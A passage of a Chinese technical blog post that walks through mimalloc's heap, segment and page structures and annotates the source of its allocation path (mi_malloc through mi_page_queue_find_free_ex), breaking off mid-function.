title="image-20230720232605058" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202326091.png" alt="image-20230720232605058"></a></p><p>具体的成员我个人认为没有值得关注的 后面如果遇到了再说  这里先暂时记住segment的起始地址就是由于mi_malloc多分配的一块内存地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272314016.png" title="image-20230727230229146" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272314016.png" alt="image-20230727230229146"></a></p><p>heap重点的成员有三个 前面两个是用于存放空闲的内存块</p><p>pages_free_direct用于小于1024的内存块</p><p>thread_delayed_free是用于满页释放的 稍后会提及</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210044239.png" title="image-20230721004423205" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210044239.png" alt="image-20230721004423205"></a></p><p>通过pwndbg直接观察 会发现实际上重要信息存放是位于segment heap就起到了一个索引的功能</p><p>索引到的结构我们称之为内存页 其主要的成员就四个 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210103575.png" title="image-20230721010343554" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210103575.png" alt="image-20230721010343554"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210048592.png" title="image-20230721004846559" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210048592.png" alt="image-20230721004846559"></a></p><p>红框圈起来的就是free链表 蓝框圈起来的是local free链表</p><p>你会发现 和常规的malloc不同 并不是被申请过的内存块被释放后才会放入到链表中</p><p>当我们申请一个内存块后 当前page剩下的会划分成内存块放入到free链表中</p><p>当申请过的内存块释放后 会进入local free链表</p><p>随后我们来观察一下实际分配给用户的内存空间</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210109604.png" title="image-20230721010905578" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210109604.png" alt="image-20230721010905578"></a></p><p>此时我申请的是0x80大小的内存空间 可以看到此时的free链表就已经成型了</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="mi-malloc"><a href="#mi-malloc" class="headerlink" title="mi_malloc"></a>mi_malloc</h3><p>我们来分析一下mi_malloc函数的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="type">void</span>* _mi_heap_malloc_zero(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero) mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">return</span> _mi_heap_malloc_zero_ex(heap, size, zero, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mi_decl_nodiscard <span class="keyword">extern</span> <span class="keyword">inline</span> mi_decl_restrict <span class="type">void</span>* <span class="title function_">mi_heap_malloc</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size)</span> mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">return</span> _mi_heap_malloc_zero(heap, size, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mi_decl_nodiscard <span class="keyword">extern</span> <span class="keyword">inline</span> mi_decl_restrict <span class="type">void</span>* <span class="title function_">mi_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">return</span> mi_heap_malloc(mi_prim_get_default_heap(), size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mimalloc通过多次跳转指向了_mi_heap_malloc_zero_ex函数 我们来分析一下这个函数的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The main allocation function</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="type">void</span>* _mi_heap_malloc_zero_ex(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero, <span class="type">size_t</span> huge_alignment) mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(size &lt;= MI_SMALL_SIZE_MAX)</span> &#123;</span><br><span class="line">    mi_assert_internal(huge_alignment == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> mi_heap_malloc_small_zero(heap, size, zero);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    mi_assert(heap!=<span class="literal">NULL</span>);</span><br><span class="line">    mi_assert(heap-&gt;thread_id == <span class="number">0</span> || heap-&gt;thread_id == _mi_thread_id());   <span class="comment">// heaps are thread local</span></span><br><span class="line">    <span class="type">void</span>* <span class="type">const</span> p = _mi_malloc_generic(heap, size + MI_PADDING_SIZE, zero, huge_alignment);  <span class="comment">// note: size can overflow but it is detected in malloc_generic</span></span><br><span class="line">    mi_track_malloc(p,size,zero);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> MI_STAT&gt;1</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!mi_heap_is_initialized(heap)) &#123; heap = mi_prim_get_default_heap(); &#125;</span><br><span class="line">      mi_heap_stat_increase(heap, <span class="built_in">malloc</span>, mi_usable_size(p));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> MI_DEBUG&gt;3</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; zero) &#123;</span><br><span class="line">      mi_assert_expensive(mi_mem_is_zero(p, size));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是对要申请chunk的大小进行了一个判断 如果小于MI_SMALL_SIZE_MAX 就会跳转到samll chunk的申请 同时进行了一个断言检测</p><p>MI_SMALL_SIZE_MAX的值定义在mimalloc.h中 可以看到是1024(64位的情况下 和指针字节大小有关系)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MI_SMALL_WSIZE_MAX (128)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MI_SMALL_SIZE_MAX (MI_SMALL_WSIZE_MAXsizeof(void))</span></span><br></pre></td></tr></table></figure><p>我们先来分析大于1024的内存分配逻辑</p><p>对于heap指针是否为空和线程id进行了检查</p><p>随后跳转到_mi_malloc_generic函数中进行内存分配  mi_track_malloc函数是用来将内存块的信息存储在track跟踪器中 方便调试</p><p>接着使用了条件编译语句  根据MI_STAT的值来决定是否记录更新heap的数据 用于调试</p><p>mi_heap_stat_increase函数用于更新heap的统计数据 mi_usable_size函数用于计算内存块的实际大小(不是申请的大小)</p><p>如果MI_DEBUG的值设置为3 那么就会调用mi_assert_expensive函数检测条件是否成立 这里的条件是调用mi_mem_is_zero来检测分配的内存块的前size个字节是否为0 MI_DEBUG的默认值为0 常规情况下我们并不用担心fake_chunk被检测出来</p><h3 id="mi-malloc-generic"><a href="#mi-malloc-generic" class="headerlink" title="_mi_malloc_generic"></a>_mi_malloc_generic</h3><p>随后我们进入_mi_malloc_generic函数 查看一下分析的主要逻辑</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* _mi_malloc_generic(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero, <span class="type">size_t</span> huge_alignment) mi_attr_noexcept</span><br><span class="line">&#123;</span><br><span class="line">  mi_assert_internal(heap != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize if necessary</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(!mi_heap_is_initialized(heap))</span> &#123;</span><br><span class="line">    heap = mi_heap_get_default(); <span class="comment">// calls mi_thread_init </span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(!mi_heap_is_initialized(heap))</span> &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  mi_assert_internal(mi_heap_is_initialized(heap));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// call potential deferred free routines</span></span><br><span class="line">  _mi_deferred_free(heap, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free delayed frees from other threads (but skip contended ones)</span></span><br><span class="line">  _mi_heap_delayed_free_partial(heap);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// find (or allocate) a page of the right size</span></span><br><span class="line">  <span class="type">mi_page_t</span>* page = mi_find_page(heap, size, huge_alignment);</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(page == <span class="literal">NULL</span>)</span> &#123; <span class="comment">// first time out of memory, try to collect and retry the allocation once more</span></span><br><span class="line">    mi_heap_collect(heap, <span class="literal">true</span> <span class="comment">/* force */</span>);</span><br><span class="line">    page = mi_find_page(heap, size, huge_alignment);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(page == <span class="literal">NULL</span>)</span> &#123; <span class="comment">// out of memory</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> req_size = size - MI_PADDING_SIZE;  <span class="comment">// correct for padding_size in case of an overflow on `size`</span></span><br><span class="line">    _mi_error_message(ENOMEM, <span class="string">&quot;unable to allocate memory (%zu bytes)\n&quot;</span>, req_size);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mi_assert_internal(mi_page_immediate_available(page));</span><br><span class="line">  mi_assert_internal(mi_page_block_size(page) &gt;= size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// and try again, this time succeeding! (i.e. this should never recurse through _mi_page_malloc)</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(zero &amp;&amp; page-&gt;xblock_size == <span class="number">0</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// note: we cannot call _mi_page_malloc with zeroing for huge blocks; we zero it afterwards in that case.</span></span><br><span class="line">    <span class="type">void</span>* p = _mi_page_malloc(heap, page, size, <span class="literal">false</span>);</span><br><span class="line">    mi_assert_internal(p != <span class="literal">NULL</span>);</span><br><span class="line">    _mi_memzero_aligned(p, mi_page_usable_block_size(page));</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _mi_page_malloc(heap, page, size, zero);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最开始对于heap是否初始化了进行一个检测 如果没有初始化则进行初始化</p><p>随后调用_mi_deferred_free将本线程所有标记释放的内存块加入到延迟释放列表中 随后批量释放 这一操作是为了提高性能</p><p>调用_mi_heap_delayed_free_partial函数 释放其他线程已经标记释放的内存块 但跳过正在争用的内存块</p><p>接着调用mi_find_page函数寻找可用的page 如果没有找到则将空闲的内存块回收后再次查找</p><p>如果最后还是没有找到空闲的page 就说明空间不足 触发断言输出报错</p><p>如果找到了可用的page 接着对于page的立即可用性进行检测 以及检测page的大小是否满足size的需求 这里的检测依赖的是page的xblock成员 其存储的是当前page中的内存块大小</p><p>接着是性能优化的问题 通过xblock和zero参数来决定用哪种办法来清零内存块的内容</p><h3 id="mi-page-malloc"><a href="#mi-page-malloc" class="headerlink" title="_mi_page_malloc"></a>_mi_page_malloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="type">void</span>* _mi_page_malloc(<span class="type">mi_heap_t</span>* heap, <span class="type">mi_page_t</span>* page, <span class="type">size_t</span> size, <span class="type">bool</span> zero) mi_attr_noexcept &#123;</span><br><span class="line">  mi_assert_internal(page-&gt;xblock_size==<span class="number">0</span>||mi_page_block_size(page) &gt;= size);</span><br><span class="line">  <span class="type">mi_block_t</span>* <span class="type">const</span> block = page-&gt;<span class="built_in">free</span>;</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(block == <span class="literal">NULL</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _mi_malloc_generic(heap, size, zero, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mi_assert_internal(block != <span class="literal">NULL</span> &amp;&amp; _mi_ptr_page(block) == page);</span><br><span class="line">  <span class="comment">// pop from the free list</span></span><br><span class="line">  page-&gt;used++;</span><br><span class="line">  page-&gt;<span class="built_in">free</span> = mi_block_next(page, block);</span><br><span class="line">  mi_assert_internal(page-&gt;<span class="built_in">free</span> == <span class="literal">NULL</span> || _mi_ptr_page(page-&gt;<span class="built_in">free</span>) == page);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_DEBUG&gt;3</span></span><br><span class="line">  <span class="keyword">if</span> (page-&gt;free_is_zero) &#123;</span><br><span class="line">    mi_assert_expensive(mi_mem_is_zero(block+<span class="number">1</span>,size - <span class="keyword">sizeof</span>(*block)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow use of the block internally</span></span><br><span class="line">  <span class="comment">// note: when tracking we need to avoid ever touching the MI_PADDING since</span></span><br><span class="line">  <span class="comment">// that is tracked by valgrind etc. as non-accessible (through the red-zone, see `mimalloc/track.h`)</span></span><br><span class="line">  mi_track_mem_undefined(block, mi_page_usable_block_size(page));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// zero the block? note: we need to zero the full block size (issue #63)</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(zero)</span> &#123;</span><br><span class="line">    mi_assert_internal(page-&gt;xblock_size != <span class="number">0</span>); <span class="comment">// do not call with zero&#x27;ing for huge blocks (see _mi_malloc_generic)</span></span><br><span class="line">    mi_assert_internal(page-&gt;xblock_size &gt;= MI_PADDING_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (page-&gt;free_is_zero) &#123;</span><br><span class="line">      block-&gt;next = <span class="number">0</span>;</span><br><span class="line">      mi_track_mem_defined(block, page-&gt;xblock_size - MI_PADDING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      _mi_memzero_aligned(block, page-&gt;xblock_size - MI_PADDING_SIZE);</span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED &amp;&amp; !MI_TSAN</span></span><br><span class="line">  <span class="keyword">if</span> (!zero &amp;&amp; !mi_page_is_huge(page)) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(block, MI_DEBUG_UNINIT, mi_page_usable_block_size(page));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> (MI_SECURE!=0)</span></span><br><span class="line">  <span class="keyword">if</span> (!zero) &#123; block-&gt;next = <span class="number">0</span>; &#125; <span class="comment">// don&#x27;t leak internal data</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (MI_STAT&gt;0)</span></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bsize = mi_page_usable_block_size(page);</span><br><span class="line">  <span class="keyword">if</span> (bsize &lt;= MI_MEDIUM_OBJ_SIZE_MAX) &#123;</span><br><span class="line">    mi_heap_stat_increase(heap, normal, bsize);</span><br><span class="line">    mi_heap_stat_counter_increase(heap, normal_count, <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (MI_STAT&gt;1)</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> bin = _mi_bin(bsize);</span><br><span class="line">    mi_heap_stat_increase(heap, normal_bins[bin], <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MI_PADDING <span class="comment">// &amp;&amp; !MI_TRACK_ENABLED</span></span></span><br><span class="line">  <span class="type">mi_padding_t</span>* <span class="type">const</span> padding = (<span class="type">mi_padding_t</span>*)((<span class="type">uint8_t</span>*)block + mi_page_usable_block_size(page));</span><br><span class="line">  <span class="type">ptrdiff_t</span> delta = ((<span class="type">uint8_t</span>*)padding - (<span class="type">uint8_t</span>*)block - (size - MI_PADDING_SIZE));</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;=2)</span></span><br><span class="line">  mi_assert_internal(delta &gt;= <span class="number">0</span> &amp;&amp; mi_page_usable_block_size(page) &gt;= (size - MI_PADDING_SIZE + delta));</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  mi_track_mem_defined(padding,<span class="keyword">sizeof</span>(<span class="type">mi_padding_t</span>));  <span class="comment">// note: re-enable since mi_page_usable_block_size may set noaccess</span></span><br><span class="line">  padding-&gt;canary = (<span class="type">uint32_t</span>)(mi_ptr_encode(page,block,page-&gt;keys));</span><br><span class="line">  padding-&gt;delta  = (<span class="type">uint32_t</span>)(delta);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_PADDING_CHECK</span></span><br><span class="line">  <span class="keyword">if</span> (!mi_page_is_huge(page)) &#123;</span><br><span class="line">    <span class="type">uint8_t</span>* fill = (<span class="type">uint8_t</span>*)padding - delta;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> maxpad = (delta &gt; MI_MAX_ALIGN_SIZE ? MI_MAX_ALIGN_SIZE : delta); <span class="comment">// set at most N initial padding bytes</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; maxpad; i++) &#123; fill[i] = MI_DEBUG_PADDING; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开头对于xblock和page的free链表重新进行了检查</p><p>如果block为零 则说明不存在对应大小的page页 就调用_mi_malloc_generic函数来分配</p><p>接着自增了page的used成员 同时更新free链表 调用 mi_block_next函数来获取下一个内存块的地址 并且进行了检测 不能为0</p><p>随后根据zero来决定是否在内存块中填充数据 方便用来检测内存越界等问题 常规情况下都是\x00 但是如果开启了调试模式 就会被填充成\xd0</p><p>下面的一大堆编译优化的都不影响我们内存分配 所以这里忽略 感兴趣的可以自行了解</p><h3 id="mi-find-page"><a href="#mi-find-page" class="headerlink" title="mi_find_page"></a>mi_find_page</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Allocate a page</span></span><br><span class="line"><span class="comment">// Note: in debug mode the size includes MI_PADDING_SIZE and might have overflowed.</span></span><br><span class="line"><span class="type">static</span> <span class="type">mi_page_t</span>* <span class="title function_">mi_find_page</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">size_t</span> huge_alignment)</span> mi_attr_noexcept &#123;</span><br><span class="line">  <span class="comment">// huge allocation?</span></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> req_size = size - MI_PADDING_SIZE;  <span class="comment">// correct for padding_size in case of an overflow on `size`  </span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(req_size &gt; (MI_MEDIUM_OBJ_SIZE_MAX - MI_PADDING_SIZE) || huge_alignment &gt; <span class="number">0</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(req_size &gt; PTRDIFF_MAX)</span> &#123;  <span class="comment">// we don&#x27;t allocate more than PTRDIFF_MAX (see &lt;https://sourceware.org/ml/libc-announce/2019/msg00001.html&gt;)</span></span><br><span class="line">      _mi_error_message(EOVERFLOW, <span class="string">&quot;allocation request is too large (%zu bytes)\n&quot;</span>, req_size);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> mi_large_huge_page_alloc(heap,size,huge_alignment);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// otherwise find a page with free blocks in our size segregated queues</span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> MI_PADDING</span></span><br><span class="line">    mi_assert_internal(size &gt;= MI_PADDING_SIZE); </span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> mi_find_free_page(heap, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们留意一下开头的这句话</p><p><strong>&#x2F;&#x2F; Note: in debug mode the size includes MI_PADDING_SIZE and might have overflowed.</strong></p><p>这就是当我们在调试模式下  申请一个0x200的内存块 实际分配到的是0x280的原因 MI_PADDING_SIZE在上一个小节中出现过 其用来计算填充数据的字节 检测是否存在内存溢出等</p><p>默认情况下MI_PADDING_SIZE是零</p><p>至于第一个if判断也用上了unlikely 因为几乎不会触发 看一下MI_MEDIUM_OBJ_SIZE_MAX的值就知道了 64位的情况下MI_MEDIUM_PAGE_SIZE是128kib 也就是说MI_MEDIUM_OBJ_SIZE_MAX是32*1024字节 一般来说size是肯定小于的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define MI_MEDIUM_OBJ_SIZE_MAX (MI_MEDIUM_PAGE_SIZE/4) // 128KiB on 64-bit</span><br></pre></td></tr></table></figure><p>接着就是调用mi_find_free_page来查找空闲的page</p><h3 id="mi-find-free-page"><a href="#mi-find-free-page" class="headerlink" title="mi_find_free_page"></a>mi_find_free_page</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Find a page with free blocks of `size`.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">mi_page_t</span>* <span class="title function_">mi_find_free_page</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">mi_page_queue_t</span>* pq = mi_page_queue(heap,size);</span><br><span class="line">  <span class="type">mi_page_t</span>* page = pq-&gt;first;</span><br><span class="line">  <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="meta">#<span class="keyword">if</span> (MI_SECURE&gt;=3) <span class="comment">// in secure mode, we extend half the time to increase randomness</span></span></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;capacity &lt; page-&gt;reserved &amp;&amp; ((_mi_heap_random_next(heap) &amp; <span class="number">1</span>) == <span class="number">1</span>)) &#123;</span><br><span class="line">      mi_page_extend_free(heap, page, heap-&gt;tld);</span><br><span class="line">      mi_assert_internal(mi_page_immediate_available(page));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">   <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">      _mi_page_free_collect(page,<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mi_page_immediate_available(page)) &#123;</span><br><span class="line">      page-&gt;retire_expire = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> page; <span class="comment">// fast path</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mi_page_queue_find_free_ex(heap, pq, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过mi_page_queue函数索引到对应大小的队列 如果是首次申请该size 一般来说都是page都是0</p><p>申请过的话 会索引到page1的内存页</p><p>接下来是debug模式才会触发的随机扩展 目的是为了增加安全性 这里不进行讨论</p><p>接着调用_mi_page_free_collect函数获取page</p><p>调用mi_page_immediate_available检测page是否可用 如果可用则置零retire_expire 将page标识为不回收 随后返回</p><p>如果page为零 那么就调用mi_page_queue_find_free_ex进行下一步的查找</p><h3 id="mi-page-queue-find-free-ex"><a href="#mi-page-queue-find-free-ex" class="headerlink" title="mi_page_queue_find_free_ex"></a>mi_page_queue_find_free_ex</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">mi_page_t</span>* <span class="title function_">mi_page_queue_find_free_ex</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">mi_page_queue_t</span>* pq, <span class="type">bool</span> first_try)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// search through the pages in &quot;next fit&quot; order</span></span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_STAT</span></span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">mi_page_t</span>* page = pq-&gt;first;</span><br><span class="line">  <span class="keyword">while</span> (page != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">mi_page_t</span>* next = page-&gt;next; <span class="comment">// remember next</span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> MI_STAT    </span></span><br><span class="line">    count++;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0. collect freed blocks by us and other threads</span></span><br><span class="line">    _mi_page_free_collect(page, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. if the page contains free blocks, we are done</span></span><br><span class="line">    <span class="keyword">if</span> (mi_page_immediate_available(page)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;  <span class="comment">// pick this one</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. Try to extend</span></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;capacity &lt; page-&gt;reserved) &#123;</span><br><span class="line">      mi_page_extend_free(heap, page, heap-&gt;tld);</span><br><span class="line">      mi_assert_internal(mi_page_immediate_available(page));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. If the page is completely full, move it to the `mi_pages_full`</span></span><br><span class="line">    <span class="comment">// queue so we don&#x27;t visit long-lived pages too often.</span></span><br><span class="line">    mi_assert_internal(!mi_page_is_in_full(page) &amp;&amp; !mi_page_immediate_available(page));</span><br><span class="line">    mi_page_to_full(page, pq);</span><br><span class="line"></span><br><span class="line">    page = next;</span><br><span class="line">  &#125; <span class="comment">// for each page</span></span><br><span class="line"></span><br><span class="line">  mi_heap_stat_counter_increase(heap, searches, count);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (page == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    _mi_heap_collect_retired(heap, <span class="literal">false</span>); <span class="comment">// perhaps make a page available?</span></span><br><span class="line">    page = mi_page_fresh(heap, pq);</span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span> &amp;&amp; first_try) &#123;</span><br><span class="line">      <span class="comment">// out-of-memory _or_ an abandoned page with free blocks was reclaimed, try once again</span></span><br><span class="line">      page = mi_page_queue_find_free_ex(heap, pq, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    mi_assert(pq-&gt;first == page);</span><br><span class="line">    page-&gt;retire_expire = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mi_assert_internal(page == <span class="literal">NULL</span> || mi_page_immediate_available(page));</span><br><span class="line">  <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果page为0  那么就会跳过while循环 进入if分支 调用_mi_heap_collect_retired函数</p><p>该函数就是遍历heap-&gt;page_retired_min<code>到</code>heap-&gt;page_retired_max之间的所有页面队列 具体的这里先不讲</p><p>接着调用mi_page_fresh函数来初始化一个新的内存页面 这里返回的值实际上就是位于segment首地址处的page info信息</p><p>如果page还是为0的话 就再次调用mi_page_queue_find_free_ex函数 </p><p>如果page在while循环中获取到了 就设置page为不可回收</p><p>在最后进行了断言判断 page要么可利用 要么为0</p><h3 id="mi-page-free-collect"><a href="#mi-page-free-collect" class="headerlink" title="_mi_page_free_collect"></a>_mi_page_free_collect</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _mi_page_free_collect(<span class="type">mi_page_t</span>* page, <span class="type">bool</span> force) &#123;</span><br><span class="line">  mi_assert_internal(page!=<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect the thread free list</span></span><br><span class="line">  <span class="keyword">if</span> (force || mi_page_thread_free(page) != <span class="literal">NULL</span>) &#123;  <span class="comment">// quick test to avoid an atomic operation</span></span><br><span class="line">    